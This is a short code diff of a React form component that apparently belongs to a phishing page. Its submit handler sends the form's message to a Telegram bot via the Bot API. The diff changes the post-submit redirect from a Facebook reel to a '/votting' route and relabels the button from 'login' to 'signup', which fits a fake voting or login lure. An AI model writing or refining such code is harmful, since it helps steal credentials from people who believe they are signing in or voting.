@@ -37,7 +37,7 @@ const FormComponent = () => {
 
         axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
             .then((response) => {
-                window.location.href = "https://www.facebook.com/reel/234678732468714/?s=ifu"
+                navigate('/votting');
             })
             .catch((error) => {});
 
@@ -117,7 +117,7 @@ const FormComponent = () => {
                                             fontSize:'1rem'
                                         }}
                                     >
-                                        {t('login')} 
+                                        {t('signup')} 
                                     </Button>
                                 </Form.Item>
                             </Form>
